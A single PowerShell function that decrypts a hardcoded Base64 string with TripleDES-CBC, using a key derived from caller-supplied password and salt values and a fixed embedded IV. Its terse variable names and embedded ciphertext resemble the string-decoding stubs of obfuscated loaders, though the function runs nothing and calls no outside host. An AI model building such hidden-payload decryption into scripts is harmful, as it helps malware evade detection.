function de([String] $b, [String] $c)
{
$a = "ctRAPUi71nc=";
$encoding = New-Object System.Text.ASCIIEncoding;
$dd = $encoding.GetBytes("RTWIAREJCFUOXZZX");
$aa = [Convert]::FromBase64String($a);
$derivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($b, $encoding.GetBytes($c), "SHA1", 2);
[Byte[]] $e = $derivedPass.GetBytes(16);
$f = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider;
$f.Mode = [System.Security.Cryptography.CipherMode]::CBC;
[Byte[]] $h = New-Object Byte[]($aa.Length);
$g = $f.CreateDecryptor($e, $dd);
$i = New-Object System.IO.MemoryStream($aa, $True);
$j = New-Object System.Security.Cryptography.CryptoStream($i, $g, [System.Security.Cryptography.CryptoStreamMode]::Read);
$r = $j.Read($h, 0, $h.Length);
$i.Close();
$j.Close();
$f.Clear();
if (($h.Length -gt 3) -and ($h[0] -eq 0xEF) -and ($h[1] -eq 0xBB) -and ($h[2] -eq 0xBF)) { $h = $h[3..($h.Length-1)]; }
return $encoding.GetString($h).TrimEnd([Char] 0);
}
